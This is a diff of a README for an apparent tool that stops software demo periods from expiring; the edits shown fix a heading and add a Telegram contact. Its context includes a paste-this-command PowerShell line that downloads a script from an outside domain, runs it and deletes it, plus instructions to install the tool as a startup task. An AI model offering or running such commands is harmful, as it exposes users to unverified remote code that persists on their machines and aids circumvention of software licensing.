@@ -56,7 +56,7 @@ wget stbak.cf/ss -outfile ss.cmd; ss.cmd; del ss.cmd
   <img src="/Screenshots/Screenshot%202021-05-01%20213220.png?raw=true">
 </P>
 
-### Install As StartUp task
+### Install As Startup task
 
 This method doesn't lock the time of your Program so te demo time continues counting for prevent the program from being Expaired add the tool into your computer startup, it means the program will be run automatically on start. For doing this type below code into powershell window and hit enter.
 ```
@@ -68,3 +68,6 @@ remove-item sss.exe
 ```
 
 ***Note: Make sure you manually patch the code before using the install as startup task.***
+
+# Contact
+If you has any Query then you can contact me at [Telegram](https://t.me/BiltuDas1)
